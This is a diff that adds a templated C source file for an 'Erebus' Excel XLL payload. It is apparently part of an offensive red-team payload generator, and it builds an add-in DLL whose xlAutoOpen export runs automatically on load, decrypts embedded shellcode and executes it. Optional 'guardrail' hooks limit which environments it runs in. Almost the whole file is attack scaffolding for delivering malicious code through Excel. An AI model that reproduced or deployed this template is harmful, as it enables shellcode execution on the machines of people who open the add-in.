@@ -1,0 +1,37 @@
+// Erebus XLL Payload Template
+// Excel Add-In DLL for shellcode execution
+// Compiled with MinGW-w64 for cross-platform Windows targets
+// Generated: {{ generation_timestamp }}
+// Shellcode Size: {{ shellcode_size }} bytes
+// Injection Method: {{ injection_method_name }}
+
+{% if guardrail_includes %}
+{{ guardrail_includes }}
+{% endif %}
+#include <windows.h>
+
+#include "xll_config.h"
+#include "xll_shellcode.h"
+#include "xll_inject.h"
+
+{% if guardrail_code %}
+{{ guardrail_code }}
+{% else %}
+static BOOL ErebusGuardrail(void) {
+    return TRUE;
+}
+{% endif %}
+
+extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void) {
+    if (!ErebusGuardrail()) {
+        return 1;
+    }
+
+    {% if encryption_type != 'NONE' %}
+    DecryptShellcode();
+    {% endif %}
+
+    ExecuteShellcode(shellcode, shellcode_len);
+
+    return 1;
+}
